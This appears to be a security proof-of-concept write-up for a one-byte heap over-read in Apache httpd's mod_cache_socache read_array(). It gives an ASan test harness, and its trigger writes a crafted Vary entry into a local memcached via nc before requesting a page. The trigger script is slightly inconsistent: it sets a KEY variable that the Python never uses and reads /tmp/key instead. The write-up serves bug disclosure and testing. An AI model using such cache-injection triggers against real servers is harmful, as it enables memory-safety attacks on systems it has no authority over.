# PoC 055 — `read_array()` over-reads after CR-terminated Vary entry

When a Vary-array element terminator is `\r` at the very end of the
retrieved socache buffer, `read_array()` advances `*slider` past the CR and
unconditionally checks `buffer[*slider]` for an optional LF, reading one
byte beyond `buffer_len`.

## Setup

Same `mod_cache_socache` + `socache_memcache` configuration as PoC 053/054.
Run httpd under ASan to make the single-byte over-read visible.

```
CFLAGS='-fsanitize=address -O1 -g' LDFLAGS='-fsanitize=address' \
   ./configure --enable-cache --enable-cache-socache \
               --enable-socache-memcache && make -j4
```

```
LoadModule cache_module           modules/mod_cache.so
LoadModule cache_socache_module   modules/mod_cache_socache.so
LoadModule socache_memcache_module modules/mod_socache_memcache.so
```

## Standalone repro harness

The arithmetic is easiest to demonstrate with the original `read_array()`
logic in a tiny harness, since shaping the exact bytes inside a real Vary
entry is fiddly:

```c
// readarray_poc.c — compile under ASan
#include <apr_general.h>
#include <apr_pools.h>
#include <apr_tables.h>
#include "httpd.h"

static apr_status_t read_array(request_rec *r, apr_array_header_t *arr,
                               unsigned char *buffer, apr_size_t buffer_len,
                               apr_size_t *slider) {
    apr_size_t val = *slider;
    while (*slider < buffer_len) {
        if (buffer[*slider] == '\r') {
            *((const char **) apr_array_push(arr)) =
                apr_pstrndup(r->pool, (const char *)buffer + val,
                             *slider - val);
            (*slider)++;
            if (buffer[*slider] == '\n') {  // <-- OOB when CR is final byte
                (*slider)++;
            }
            val = *slider;
        } else {
            (*slider)++;
        }
    }
    return APR_SUCCESS;
}

int main(void) {
    apr_initialize();
    apr_pool_t *p; apr_pool_create(&p, NULL);
    request_rec r = {0}; r.pool = p;
    apr_array_header_t *a = apr_array_make(p, 4, sizeof(const char*));
    unsigned char *buf = apr_palloc(p, 2);
    buf[0] = 'A'; buf[1] = '\r';
    apr_size_t slider = 0;
    read_array(&r, a, buf, 2, &slider);
    return 0;
}
```

Build:

```
clang -fsanitize=address -I/usr/include/apr-1 -I include readarray_poc.c \
      -lapr-1 -laprutil-1 -o readarray_poc
./readarray_poc
```

## Trigger

Inside Apache, store a Vary entry whose payload tail is `"A\r"` (after the
fixed-size Vary header) at the cached key:

```
KEY=$(grep -oE 'vary cache key: [^ ]+' logs/error_log | tail -1 | awk '{print $4}')

python3 - <<'PY' | nc -q1 127.0.0.1 11211
import struct, sys
fmt = struct.pack('<I', 0x56415259)            # CACHE_SOCACHE_VARY_FORMAT_VERSION
expire = struct.pack('<q', 0)                  # apr_time_t expire = 0
payload = fmt + expire + b'A\r'                # final byte == \r
key = open('/tmp/key').read().strip()
sys.stdout.buffer.write(f'set {key} 0 0 {len(payload)}\r\n'.encode()
                       + payload + b'\r\n')
PY
curl -H 'Accept-Encoding: identity' http://127.0.0.1:8080/index.html
```

## Observed effect

```
==pid==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x...
    #0 ... read_array modules/cache/mod_cache_socache.c:152
```

The standalone harness yields the same diagnostic for the bare logic.

## Log marker

Pre-patch: ASan report only. Post-patch the optional-LF check is
skipped and the function returns `APR_SUCCESS` without dereferencing past
the buffer.
